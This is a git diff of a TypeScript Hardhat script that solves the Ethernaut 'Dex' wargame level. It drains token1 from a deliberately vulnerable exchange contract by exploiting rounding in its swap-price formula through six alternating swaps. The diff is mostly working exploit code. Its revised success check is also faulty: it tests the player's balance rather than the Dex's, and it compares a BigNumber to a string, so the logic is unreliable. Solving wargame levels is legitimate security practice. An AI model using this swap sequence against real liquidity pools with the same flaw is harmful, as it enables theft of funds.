@@ -3,8 +3,9 @@ import { ethers } from "hardhat";
 const attackDex = async () => {
     // change contract addresses here.
     const dexAddress = "0x10929702D8f5E0720596E87d3567874b37848Ee3";
-    const token1Address = "0x85aE05EF06fbAFfaA0BE49ECE835c60569E59f22"; //type "await contract.token1()" in ethernaut console
-    const token2Address = "0xf2B9A6A13e103E5b0E028Fd07Cf4d4cf879D3C34"; //type "await contract.token2()" in ethernaut console
+    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
+    // const token1Address = "0x85aE05EF06fbAFfaA0BE49ECE835c60569E59f22"; //type "await contract.token1()" in ethernaut console
+    // const token2Address = "0xf2B9A6A13e103E5b0E028Fd07Cf4d4cf879D3C34"; //type "await contract.token2()" in ethernaut console
 
     // Don't touch below
     // Vulnerability comes from get_swap_price(). division wont always result in an integer
@@ -79,8 +80,18 @@ const attackDex = async () => {
             type: "function",
         },
     ];
-    const contractAttack = await ethers.getContractAt(ABI, dexAddress);
-    const approve = await contractAttack.approve(dexAddress, 500);
+    const contract = await ethers.getContractAt(ABI, dexAddress);
+    const token1Address = await contract.token1();
+    const token2Address = await contract.token2();
+    console.log(`Token 1 address is: ${token1Address}`);
+    console.log(`Token 2 address is: ${token2Address}`);
+    console.log("Checking token 1 and 2 balances...");
+    let token1Balance = await contract.balanceOf(token1Address, player);
+    let token2Balance = await contract.balanceOf(token2Address, player);
+    console.log(`Token 1 balance is: ${token1Balance}`);
+    console.log(`Token 2 balance is: ${token2Balance}`);
+    console.log("Approving Dex contract to spend 500 tokens...");
+    const approve = await contract.approve(dexAddress, 500);
     const approveReceipt = await approve.wait();
     console.log(approveReceipt);
     // sample table below of continous swap
@@ -95,18 +106,49 @@ const attackDex = async () => {
     //   110     45    |   0       65
     //   0       90    |   110     20
     // execution below
-    const swap1 = await contractAttack.swap(token1Address, token2Address, 10);
-    const swap2 = await contractAttack.swap(token2Address, token1Address, 20);
-    const swap3 = await contractAttack.swap(token1Address, token2Address, 24);
-    const swap4 = await contractAttack.swap(token2Address, token1Address, 30);
-    const swap5 = await contractAttack.swap(token1Address, token2Address, 41);
-    const swap6 = await contractAttack.swap(token2Address, token1Address, 45);
+    console.log("Doing a series of swap...");
+    console.log("swap 1...");
+    const swap1 = await contract.swap(token1Address, token2Address, 10);
+    token1Balance = await contract.balanceOf(token1Address, player);
+    token2Balance = await contract.balanceOf(token2Address, player);
+    console.log(`Token 1 balance is: ${token1Balance}`);
+    console.log(`Token 2 balance is: ${token2Balance}`);
+
+    console.log("swap 2...");
+    const swap2 = await contract.swap(token2Address, token1Address, 20);
+    token1Balance = await contract.balanceOf(token1Address, player);
+    token2Balance = await contract.balanceOf(token2Address, player);
+    console.log(`Token 1 balance is: ${token1Balance}`);
+    console.log(`Token 2 balance is: ${token2Balance}`);
+
+    console.log("swap 3...");
+    const swap3 = await contract.swap(token1Address, token2Address, 24);
+    token1Balance = await contract.balanceOf(token1Address, player);
+    token2Balance = await contract.balanceOf(token2Address, player);
+    console.log(`Token 1 balance is: ${token1Balance}`);
+    console.log(`Token 2 balance is: ${token2Balance}`);
+
+    console.log("swap 4...");
+    const swap4 = await contract.swap(token2Address, token1Address, 30);
+    token1Balance = await contract.balanceOf(token1Address, player);
+    token2Balance = await contract.balanceOf(token2Address, player);
+    console.log(`Token 1 balance is: ${token1Balance}`);
+    console.log(`Token 2 balance is: ${token2Balance}`);
+
+    console.log("swap 5...");
+    const swap5 = await contract.swap(token1Address, token2Address, 41);
+    token1Balance = await contract.balanceOf(token1Address, player);
+    token2Balance = await contract.balanceOf(token2Address, player);
+    console.log(`Token 1 balance is: ${token1Balance}`);
+    console.log(`Token 2 balance is: ${token2Balance}`);
+    console.log("swap 6...");
+    const swap6 = await contract.swap(token2Address, token1Address, 45);
     // conslusion check balance
-    const token1Balance = await contractAttack
-        .balanceOf(token1Address, dexAddress)
-        .then((v: any) => v.toString());
-    const token1BalanceReceipt = token1Balance.wait(1);
-    if (token1BalanceReceipt === "0") {
+    token1Balance = await contract.balanceOf(token1Address, player);
+    token2Balance = await contract.balanceOf(token2Address, player);
+    console.log(`Token 1 balance is: ${token1Balance}`);
+    console.log(`Token 2 balance is: ${token2Balance}`);
+    if (token1Balance === "0") {
         console.log("Token1 balance is 0, Level passed! submit to ethernaut");
     } else {
         console.log("Token1 balance is not 0, Level failed! review code above");
